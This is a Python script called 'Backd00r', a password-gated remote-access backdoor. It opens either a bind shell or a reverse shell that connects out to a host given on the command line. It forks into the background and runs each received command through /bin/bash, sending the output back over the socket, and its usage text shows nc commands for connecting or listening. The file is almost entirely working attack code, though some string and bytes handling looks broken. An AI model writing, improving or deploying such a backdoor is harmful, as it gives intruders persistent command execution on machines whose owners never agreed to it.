#!/usr/bin/python3

import sys, os, socket, time

# ======== Variables ========
MAX_LEN = 1024
SHELL = "/bin/bash -c"
TIME_OUT = 300
PW = ""
PORT = ""
HOST = ""

# ======== Functions ========
def usage():
	print("usage:\n" + 
		  "\t./Backd00r -b password port\n" +
		  "\t./Backd00r -r password port host\n" +
		  "\tnc host port\n" +
		  "\tnc -l -p port\n")
	exit(1)

def shell(cmd):
	"""
	Creates shell and return output
	"""
	sh_out = os.popen(SHELL + " " + cmd).readlines() # Run Command
	nsh_out = ""
	for i in range(len(sh_out)):					 # Copy results
		nsh_out += sh_out[i]						 # and return
	return nsh_out

def action(conn): 
	"""
	Asks for password and creates shell
	"""
	passwd = bytes("\nPassword?\n","utf-8")
	conn.send(passwd)
	try:
		pw_in = conn.recv(len(PW))
	except:
		print("timeout")
	else:
		pw_in = str(pw_in)
		if (pw_in == PW):
			conn.send("opened d00r!\n")
			while True: # Connection Loop
				cmd_line = bytes("$ ","utf-8")
				conn.send(cmd_line)
				try:
					pcmd = conn.recv(MAX_LEN)
				except:
					print("timeout")
					return True
				else:
					cmd = ""
					for i in range(len(pcmd) - 1):
						cmd += pcmd[i]
					if (cmd == ":dc"): 
						return True
					elif (cmd == ":sd"):
						return False
					else:
						if (len(cmd) > 0):
							out = shell(cmd) # run command and return results
							conn.send(out)


# ======== Main ========
argv = sys.argv

# Assign variables
if (len(argv) < 4):
	usage()
elif (argv[1] == '-b'):
	PW = argv[2]
	PORT = argv[3]
elif ((argv[1] == '-r') and (len(argv) > 4)):
	PW = argv[2]
	PORT = argv[3]
	HOST = argv[4]
else:
	exit(1)

PORT = int(PORT)

print(f"Password: " + str(PW) + "\n" +
	   "Port: " + str(PORT) + "\n" +
	   "Host: " + HOST + "\n")

# Create new process, kill parent process
if (os.fork() != 0):
	sys.exit(0)

# Create Socket
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.settimeout(TIME_OUT)

if (argv[1] == "-b"):
	sock.bind(('localhost',PORT))
	sock.listen(0)

run = True
while run:

	if (argv[1] == "-r"): 			  # Reverse Shell
		try:						  # try
			sock.connect((HOST,PORT)) # Connect Socket
		except: 					  # except
			print("Host Unreachable") # host unreachable sleep
			time.sleep(5)
		else:						  # Execute if no exception
			run = action(sock)	  	  # establish connection
	else:							  # else
		try:						  # try
			(conn,addr) = sock.accept() # accept connection
		except:						  # except
			print("timeout")		
			time.sleep(1)
		else:						  # else
			run = action(conn)		  # run action with current connection

		if (argv[1] == "-b"):
			conn.shutdown(2)
		else:
			try:
				sock.send("")
			except:
				time.sleep(1)
			else:
				sock.shutdown(2)